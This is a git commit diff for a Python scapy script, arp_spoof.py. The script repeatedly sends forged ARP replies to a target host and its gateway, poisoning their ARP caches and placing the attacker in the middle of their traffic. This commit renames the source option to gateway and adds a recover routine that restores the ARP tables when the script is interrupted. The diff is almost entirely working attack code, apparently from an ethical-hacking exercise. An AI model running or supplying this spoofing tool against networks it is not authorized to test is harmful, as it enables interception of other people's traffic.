a75289ab336cd5815582fefe48f7e50abe446458
bharath512 <67639106+bharath512@users.noreply.github.com>
2024-12-27 11:58:13 +0530

    Update arp_spoof.py

--- arp_spoof.py
+++ arp_spoof.py
@@ -7,10 +7,10 @@ import logging
 
 def get_argument():
     parser=optparse.OptionParser()
-    parser.add_option("-s", "--source", dest="ip_src", help="Provide the IP wanted to spoof")
+    parser.add_option("-g", "--gateway", dest="ip_gat", help="Provide the IP wanted to spoof")
     parser.add_option("-t","--target",dest="ip_tar",help="Provide the IP as spoof")
     (options, arugments) = parser.parse_args()
-    if not (options.ip_src and options.ip_tar):
+    if not (options.ip_gat and options.ip_tar):
         parser.error("Please enter IP to search. Use --help for more information")
     return options
 
@@ -28,12 +28,22 @@ def spoof(target_ip, spoof_ip):
     logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
     scapy.send(packet, verbose=False)
 
+def recover(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
 options = get_argument()
-get_mac(options.ip_tar)
 sent_packet_count = 0
-while True:
-    spoof(options.ip_tar,options.ip_src)
-    spoof(options.ip_src,options.ip_tar)
-    sent_packet_count = sent_packet_count + 2
-    print("\r[+] Packet Sent: " + str(sent_packet_count),end="")
-    time.sleep(2)
+try:
+    while True:
+        spoof(options.ip_tar,options.ip_gat)
+        spoof(options.ip_gat,options.ip_tar)
+        sent_packet_count = sent_packet_count + 2
+        print("\r[+] Packet Sent: " + str(sent_packet_count),end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    recover(options.ip_tar,options.ip_gat)
+    recover(options.ip_gat,options.ip_tar)
+    print("\n[+] Stopped spoofing and reverting the changes.... Please wait")
